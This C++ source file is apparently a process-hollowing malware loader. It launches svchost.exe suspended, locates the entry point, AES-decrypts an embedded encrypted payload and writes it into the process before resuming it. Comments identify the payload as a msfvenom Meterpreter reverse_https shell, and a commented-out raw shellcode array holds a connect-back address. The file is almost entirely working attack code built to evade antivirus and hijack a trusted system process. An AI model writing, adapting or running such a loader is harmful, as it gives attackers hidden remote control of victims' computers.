// ProcessHollowCPP.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <Winternl.h>
#include <stdint.h>
#include <psapi.h>
#include <ntstatus.h>
#include <bcrypt.h>
#pragma comment(lib,"bcrypt.lib")

int Error(const char* msg, HANDLE hProc) {
    printf("%s (%u)\n", msg, GetLastError());
    TerminateProcess(hProc, 0);
    return 1;
}

//zw query information
typedef unsigned long(__stdcall* pfnZwQueryInformationProcess)(IN  HANDLE,IN  unsigned int,OUT PVOID,IN  ULONG,OUT PULONG);

pfnZwQueryInformationProcess ZwQueryInfoProcess = (pfnZwQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwQueryInformationProcess");

// msfvenom windows/64/meterpreter/reverse_https -f csharp 
/* unencrypted payload below
unsigned char buf[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x48, 0x31, 0xd2, 0x51, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x8b, 0x72, 0x50, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b, 0x48,
        0x18, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x4d, 0x31, 0xc9, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9,
        0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
        0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
        0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,
        0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
        0x4b, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xdb, 0x53, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69,
        0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x48, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26,
        0x07, 0xff, 0xd5, 0x53, 0x53, 0x48, 0x89, 0xe1, 0x53, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31,
        0xc9, 0x53, 0x53, 0x49, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5,
        0xe8, 0x0e, 0x00, 0x00, 0x00, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x32,
        0x32, 0x2e, 0x31, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x49, 0xc7, 0xc0, 0xbb, 0x01, 0x00, 0x00,
        0x4d, 0x31, 0xc9, 0x53, 0x53, 0x6a, 0x03, 0x53, 0x49, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0x00,
        0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x3f, 0x00, 0x00, 0x00, 0x2f, 0x64, 0x4c, 0x52, 0x58,
        0x4e, 0x66, 0x4a, 0x53, 0x46, 0x4f, 0x73, 0x65, 0x4c, 0x68, 0x38, 0x73, 0x66, 0x6a, 0x51,
        0x4e, 0x6e, 0x41, 0x4f, 0x55, 0x41, 0x46, 0x75, 0x51, 0x51, 0x2d, 0x54, 0x71, 0x56, 0x50,
        0x7a, 0x71, 0x73, 0x66, 0x2d, 0x73, 0x59, 0x6e, 0x39, 0x71, 0x4a, 0x64, 0x55, 0x44, 0x76,
        0x6c, 0x4f, 0x59, 0x4c, 0x62, 0x79, 0x31, 0x74, 0x75, 0x61, 0x51, 0x54, 0x00, 0x48, 0x89,
        0xc1, 0x53, 0x5a, 0x41, 0x58, 0x4d, 0x31, 0xc9, 0x53, 0x48, 0xb8, 0x00, 0x32, 0xa8, 0x84,
        0x00, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0xeb, 0x55, 0x2e, 0x3b, 0xff,
        0xd5, 0x48, 0x89, 0xc6, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x6a, 0x1f, 0x5a, 0x52, 0x68,
        0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x6a, 0x04, 0x41, 0x59, 0x49, 0xba, 0x75, 0x46,
        0x9e, 0x86, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x53, 0x5a, 0x48, 0x89,
        0xf1, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0x2d, 0x06, 0x18,
        0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x1f, 0x48, 0xc7, 0xc1, 0x88, 0x13, 0x00, 0x00, 0x49,
        0xba, 0x44, 0xf0, 0x35, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0xff, 0xcf, 0x74,
        0x02, 0xeb, 0xaa, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x53, 0x59, 0x6a, 0x40, 0x5a, 0x49, 0x89,
        0xd1, 0xc1, 0xe2, 0x10, 0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, 0x49, 0xba, 0x58, 0xa4,
        0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7,
        0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89,
        0xf9, 0x49, 0xba, 0x12, 0x96, 0x89, 0xe2, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x83,
        0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb2, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75,
        0xd2, 0x58, 0xc3, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff,
        0xd };
*/
unsigned char iv[] = 
{ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00  };
unsigned char key[] = 
{ 0xf9, 0x1b, 0xf0, 0x49, 0xe3, 0x2b, 0xb1, 0x64, 0x07, 0x16, 
0xe1, 0xe0, 0x0b, 0x8b, 0xee, 0xa3  };
unsigned char payload[] = 
{ 0x15, 0xcb, 0x0b, 0x7b, 0x72, 0x01, 0x18, 0xcb, 0xb4, 0x74, 
0x2c, 0xaa, 0x4b, 0xa9, 0xd7, 0x43, 0xa0, 0x72, 0x48, 0x62, 
0x3b, 0x2e, 0x12, 0xb0, 0xc4, 0x89, 0xde, 0x86, 0xfe, 0x73, 
0x90, 0x5b, 0x6d, 0x79, 0x49, 0xe8, 0x33, 0x13, 0x25, 0xe7, 
0xd4, 0x1f, 0xf5, 0x81, 0x9c, 0x50, 0x29, 0xe1, 0x9c, 0xfd, 
0x12, 0x45, 0xe1, 0x22, 0x13, 0xa5, 0x2b, 0xe2, 0x60, 0x05, 
0xaa, 0xf8, 0xdc, 0x09, 0x72, 0x22, 0x97, 0xa6, 0x05, 0x73, 
0x11, 0x16, 0xa7, 0xd8, 0x28, 0x7b, 0x81, 0xf8, 0x55, 0xde, 
0x6d, 0xb0, 0xba, 0xe1, 0x0e, 0x8e, 0xf8, 0x2a, 0xb5, 0x8c, 
0x8e, 0x77, 0xeb, 0x74, 0xa6, 0xbe, 0x12, 0xa4, 0x38, 0x59, 
0x47, 0xe0, 0x8e, 0x45, 0xb0, 0x2d, 0x06, 0xef, 0xe8, 0xbb, 
0x0f, 0xbc, 0xab, 0x7e, 0x23, 0x60, 0xeb, 0x17, 0xe0, 0x5e, 
0xf7, 0xae, 0x55, 0xd6, 0x8c, 0x63, 0x50, 0xd9, 0xdf, 0x91, 
0xf4, 0xbc, 0x51, 0x70, 0x6c, 0xf2, 0x42, 0x11, 0xd1, 0x68, 
0x6a, 0xf4, 0x3c, 0x5c, 0xa0, 0x7c, 0x41, 0x33, 0x73, 0x77, 
0x5b, 0xae, 0x7e, 0xa0, 0xa5, 0x4a, 0x40, 0xf6, 0x62, 0xd2, 
0x4f, 0x10, 0xef, 0x69, 0x88, 0xbd, 0xe6, 0x07, 0xd9, 0xc6, 
0x30, 0x9a, 0xfe, 0xab, 0x87, 0x79, 0x98, 0xa0, 0x94, 0x20, 
0x0e, 0x6f, 0xf6, 0x61, 0x9d, 0xd6, 0xf1, 0x42, 0xa8, 0x3c, 
0x53, 0x6b, 0x0f, 0xd8, 0xdf, 0x7d, 0xf8, 0xc9, 0xbf, 0x4f, 
0xd7, 0xe3, 0xd5, 0x17, 0x93, 0x9f, 0x3f, 0x57, 0xe1, 0xef, 
0xb1, 0xb1, 0xd4, 0x4b, 0x6e, 0x4f, 0x77, 0x80, 0x18, 0xa3, 
0xf1, 0xe9, 0x82, 0xd7, 0x8a, 0x6f, 0x38, 0x0a, 0xb7, 0x64, 
0x2a, 0x70, 0x45, 0x59, 0xac, 0x45, 0x3f, 0x04, 0x2a, 0xc7, 
0x47, 0xe9, 0x7c, 0x32, 0x53, 0xab, 0x0f, 0xd6, 0x17, 0x34, 
0xe5, 0xba, 0xb0, 0x55, 0xa8, 0x3b, 0x2c, 0x40, 0x3f, 0x84, 
0x8c, 0x4b, 0xa3, 0x11, 0x16, 0xe6, 0xe1, 0x65, 0x01, 0x6a, 
0x2d, 0xb7, 0xa6, 0xec, 0x49, 0x16, 0x1c, 0x07, 0xb3, 0xc8, 
0xbb, 0xbd, 0x81, 0xf1, 0x53, 0x26, 0xb1, 0x37, 0xec, 0xbf, 
0xac, 0x2b, 0xd5, 0x85, 0xf3, 0x95, 0xba, 0x1a, 0xfd, 0xc2, 
0x99, 0xac, 0x22, 0xb2, 0x08, 0xe6, 0x26, 0x65, 0xc7, 0xef, 
0x5c, 0xa5, 0xb2, 0xe6, 0xe8, 0xf9, 0x7f, 0xdc, 0x21, 0x41, 
0x6d, 0xd9, 0xd5, 0x22, 0x47, 0x75, 0x4c, 0xe7, 0x85, 0xed, 
0x67, 0xbf, 0xd4, 0x91, 0x11, 0xe0, 0x85, 0xae, 0x71, 0x18, 
0x48, 0x66, 0x8f, 0xda, 0x4d, 0xaf, 0x18, 0x45, 0xda, 0x3b, 
0x8d, 0x5c, 0x32, 0x4e, 0x53, 0x3c, 0xb6, 0xfa, 0x50, 0xe9, 
0xe3, 0xa2, 0x26, 0xe7, 0xa8, 0x12, 0x28, 0x66, 0x01, 0x20, 
0x49, 0xa2, 0x19, 0x83, 0xd5, 0x63, 0x96, 0x2f, 0xa5, 0xd5, 
0xde, 0x90, 0xa4, 0x31, 0x76, 0x5f, 0x7a, 0x1e, 0x5f, 0xa7, 
0x02, 0xa2, 0x98, 0x11, 0x37, 0xa7, 0x6a, 0xb2, 0x76, 0x8e, 
0x9a, 0xe2, 0x28, 0x92, 0x67, 0xa8, 0x69, 0x57, 0x57, 0x35, 
0x5d, 0x80, 0x95, 0xe8, 0xd0, 0x4c, 0x8b, 0xf9, 0x30, 0x35, 
0x27, 0xc6, 0x7d, 0x9a, 0xa1, 0x00, 0x71, 0x28, 0x66, 0xca, 
0x8a, 0x3e, 0x32, 0x9c, 0x82, 0xda, 0xc8, 0x8f, 0xe2, 0xed, 
0x79, 0x0a, 0x07, 0xb8, 0x39, 0x50, 0x82, 0xf0, 0x7f, 0x30, 
0x1a, 0x3d, 0x80, 0x2c, 0x0c, 0x20, 0x0a, 0x8a, 0x1f, 0xbc, 
0x07, 0xb4, 0x57, 0xfe, 0x6b, 0x2d, 0x20, 0x15, 0x03, 0x01, 
0x54, 0xda, 0xb8, 0xf6, 0xcc, 0x5d, 0x79, 0xb5, 0x3a, 0x37, 
0xf3, 0x6d, 0xd6, 0x2c, 0xf0, 0xd7, 0x11, 0xcc, 0x73, 0x3d, 
0x5c, 0xcd, 0xef, 0x5f, 0xca, 0xe8, 0xca, 0xa1, 0x0d, 0x73, 
0xc0, 0xf2, 0x0a, 0xc0, 0x93, 0x13, 0xfd, 0xc7, 0xfb, 0xb9, 
0x5a, 0x3a, 0x81, 0xfb, 0x7f, 0x4b, 0x97, 0x28, 0xd9, 0x10, 
0xbd, 0x60, 0x11, 0x56, 0xae, 0x1e, 0x67, 0x03, 0xae, 0xeb, 
0xa3, 0x3a, 0x73, 0xbc, 0x9a, 0xce, 0xaf, 0x01, 0xa7, 0xc0, 
0x8f, 0xbe, 0xa2, 0x86, 0x11, 0xbe, 0xec, 0x5d, 0xbc, 0xfc, 
0x52, 0x9c, 0xca, 0xd2, 0x86, 0xa6, 0xff, 0xed, 0x32, 0x53, 
0xc1, 0x5e, 0x80, 0x06, 0xfc, 0x57, 0x18, 0xf9, 0xdd, 0xc0, 
0x99, 0x27, 0x06, 0x1f, 0x18, 0x22, 0x5a, 0x3c, 0xb8, 0xda, 
0x72, 0x3b, 0x3e, 0xb8, 0xfc, 0xb8, 0x89, 0xb6, 0xc6, 0x53, 
0x45, 0x5b, 0xe0, 0x56, 0x75, 0x5e, 0x13, 0x4e, 0x82, 0x13, 
0x8b, 0xf6, 0x30, 0x70, 0x28, 0xa1, 0x6b, 0xdc, 0xed, 0x18, 
0x7d, 0x47, 0xf7, 0x6d, 0xa2, 0xe8, 0x52, 0x33, 0xf4, 0x56, 
0x19, 0xd3, 0x80, 0x39, 0x00, 0x26, 0x63, 0xe2, 0xc6, 0xc0, 
0xd7, 0x66, 0xfd, 0x1d, 0x6a, 0xa5, 0x22, 0xb8, 0x89, 0x11, 
0xc8, 0x7f, 0x12, 0x6f, 0x08, 0xfe, 0x1f, 0xef, 0xcb, 0x45, 
0x63, 0xd6, 0xf2, 0x97, 0x6b, 0xbc, 0x79, 0x33, 0xa5, 0x46, 
0x5f, 0x5e, 0xf5, 0xc2, 0x2d, 0x1d, 0xd2, 0xc6, 0x87, 0x86, 
0x06, 0x7e, 0xa5, 0xad, 0xb0, 0xb9, 0xde, 0x52, 0x5f, 0x2b, 
0xb3, 0x3f, 0xcf, 0xdc, 0xfa, 0xf7, 0xcb, 0x95  };





int bufSize = sizeof(payload);
PBYTE decrypted;
DWORD decryptedSize;

int DecryptPayload() {
    // openAlgProvider
    // open alg handle section // 
    BCRYPT_ALG_HANDLE hAesAlg;
    if (BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
        return Error("Failed to get handle to algo provider",NULL);
    }
    // get key and handle to key ///
    //calc size of buffer to hold key object
    DWORD keyObjSize;
    DWORD bytesRead;
    if (BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&keyObjSize, sizeof(DWORD), &bytesRead, 0) != STATUS_SUCCESS)
        return Error("Failed to get size for key object", NULL);
    PBYTE keyObject;
    keyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, keyObjSize);
    if (keyObject == NULL)
        return Error("Failed to alloc heap for keyObject", NULL);
    // calc block length for IV
    DWORD blockLenSize;
    if (BCryptGetProperty(hAesAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&blockLenSize, sizeof(DWORD), &bytesRead, 0) != STATUS_SUCCESS)
        return Error("Failed to get size for IV", NULL);
    // check if blockLen is longer than IV
    if (blockLenSize > sizeof(iv))
        return Error("Error Block len is greater than IV", NULL);
    //alloc buffer for iv 
   //buffer is consumed during encrypt/decrypt process
    PBYTE ivBuffer;
    ivBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, blockLenSize);
    if (ivBuffer == NULL) {
        return Error("Failed to alloc memory for iv buffer", NULL);
    }
    //copy iv into ivBuffer
    memcpy(ivBuffer, iv, blockLenSize);
    // set mode aes CBC
    if (BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != STATUS_SUCCESS)
        return Error("Failed to set decryption mode", NULL);
    // generate key from key bytes
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptGenerateSymmetricKey(hAesAlg, &hKey, keyObject, keyObjSize, (PBYTE)key, sizeof(key), 0) != STATUS_SUCCESS)
        return Error("Failed to generated key from key bytes", NULL);
    // continue here
     // get output buffer size for decrypted text
    if (BCryptDecrypt(hKey, payload, sizeof(payload), NULL, ivBuffer, blockLenSize, NULL, 0, &decryptedSize, BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS)
        return Error("Failed to get size of decrypted payload", NULL);
    // allocate memory for decrypted text
    decrypted = (PBYTE)HeapAlloc(GetProcessHeap(), 0, decryptedSize);
    if (decrypted == NULL)
        return Error("Failed to allocate memory for plaintext", NULL);
    if (BCryptDecrypt(hKey, payload, sizeof(payload), NULL, ivBuffer, blockLenSize, decrypted, decryptedSize, &decryptedSize, BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS)
        return Error("Failed to decrypt payload", NULL);
    //printf("::: Decrypted :::\n");
    //PrintBytes(decrypted, decryptedSize);
    // free memory and close handles
    BCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (hKey)
        BCryptDestroyKey(hKey);
    //if (decrypted)
    //    HeapFree(GetProcessHeap(), 0, decrypted);
    if (keyObject)
        HeapFree(GetProcessHeap(), 0, keyObject);
    if (ivBuffer)
        HeapFree(GetProcessHeap(), 0, ivBuffer);
    printf("::: successful! :::\n");
    //pOutputDebugStringA("successfully decryped");
    return 0;
}

int main()
{
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    char svcHost[] = "C:\\windows\\system32\\svchost.exe";
    if (!CreateProcessA(nullptr, svcHost, nullptr, nullptr, false, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return Error("Failed to create process",NULL);
    printf("::: Created PID %u :::\n", pi.dwProcessId);
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;
    // errors check here
    HANDLE hProcess = pi.hProcess;
    ZwQueryInfoProcess(hProcess,ProcessBasicInformation,&bi,sizeof(bi),&tmp);
    PVOID peb = &bi.PebBaseAddress;
    PVOID ptrToImageBase = bi.PebBaseAddress->Reserved3 + 0x1; // <= issue right here needs to add 0x10 to address
    printf("::: peb base =>     0x%p :::\n", bi.PebBaseAddress);
    printf("::: ptr img base => 0x%p :::\n", ptrToImageBase);
    unsigned char addrBuf[8];
    int addrBufLength = sizeof(addrBuf);
    SIZE_T nRead;
    SIZE_T nWrite;
    if (ReadProcessMemory(hProcess, PBYTE(ptrToImageBase), &addrBuf, 8, &nRead) == 0)
        return Error("Failed to read memory from process",hProcess);
    printf("::: num bytes read into buffer => %u :::\n",nRead);
    uint64_t processBaseAddress = *reinterpret_cast<uint64_t*>(addrBuf); // <= points to entry point
    printf("::: process Base Address => %p :::\n", processBaseAddress);
    unsigned char data[0x200]; // <= memory we need to parse in child process
    int dataLength = sizeof(data);
    if (ReadProcessMemory(hProcess, (void*)processBaseAddress, data, dataLength, &nRead) == 0)
        return Error("Failed to read memory from process 2", hProcess);
    printf("::: num bytes read into buffer => %u :::\n", nRead);
    printf("::: Reading done need to parse memory now :::\n");
    IMAGE_DOS_HEADER dos_headers{ };
    IMAGE_NT_HEADERS nt_headers { };
    if (ReadProcessMemory(hProcess, reinterpret_cast<const void*>(processBaseAddress), &dos_headers, sizeof(IMAGE_DOS_HEADER), nullptr) == 0)
        return Error("Failed to read dos header", hProcess);
    if (ReadProcessMemory(hProcess, reinterpret_cast<const void*>(processBaseAddress + dos_headers.e_lfanew), &nt_headers, sizeof(IMAGE_NT_HEADERS), nullptr) == 0)
        return Error("failed to read nt header", hProcess);
    DWORD64 test = (DWORD64)nt_headers.OptionalHeader.AddressOfEntryPoint;
    uint64_t addressOfEntryPoint = processBaseAddress + nt_headers.OptionalHeader.AddressOfEntryPoint;
    printf("::: addr of entry point in child process :::%p\n", addressOfEntryPoint);
    printf("::: decrypting payload :::\n");
    DecryptPayload();
    if (WriteProcessMemory(hProcess, reinterpret_cast<void*>(addressOfEntryPoint), decrypted, decryptedSize, &nRead) == 0)
        return Error("Failed to write payload", hProcess);
    ResumeThread(pi.hThread);
    return 0;

}
